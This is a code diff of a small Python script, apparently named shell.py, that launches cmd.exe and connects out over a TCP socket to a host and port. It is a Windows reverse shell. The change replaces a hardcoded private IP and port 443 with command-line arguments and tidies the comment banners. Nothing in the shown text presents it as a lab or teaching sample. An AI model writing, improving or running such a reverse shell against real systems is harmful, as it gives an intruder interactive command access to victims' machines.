@@ -3,13 +3,18 @@ import socket
 import re
 import sys
 
+##############################################################################
+#   Class Definitions                                                        # 
+##############################################################################
+
 class InteractiveCommand():
 	""" Sets up an interactive session with a process and uses prompt to
 	determine when input can be passed into the command."""
 	
 	def __init__(self, process, prompt):
-		self.process = subprocess.Popen( process, shell=True, stdin=subprocess.PIPE,
-							stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
+		self.process = subprocess.Popen( process, shell=True, 
+				stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
+				stderr=subprocess.STDOUT )
 		
 		self.prompt  = prompt
 		self.wait_for_prompt()
@@ -29,15 +34,31 @@ class InteractiveCommand():
 		return self.wait_for_prompt()
 
 
-###############################################################################
-#    MAIN PROGRAM                                                             #
-###############################################################################
-		
-cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.133.176'
-port = 443
+##############################################################################
+#   Function Definitions                                                     # 
+##############################################################################
 
+def usage():
+	print("shell.py server port")
+	sys.exit()
+
+
+##############################################################################
+#    MAIN PROGRAM                                                            #
+##############################################################################
+
+if len(sys.argv) != 3:
+	usage()
+	
+if sys.argv[1] == '-h':
+	usage()
+else:
+	host = sys.argv[1]
+	port = int(sys.argv[2])
+	
+cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host, port))
 sock.send("[*] Connection recieved.")
 
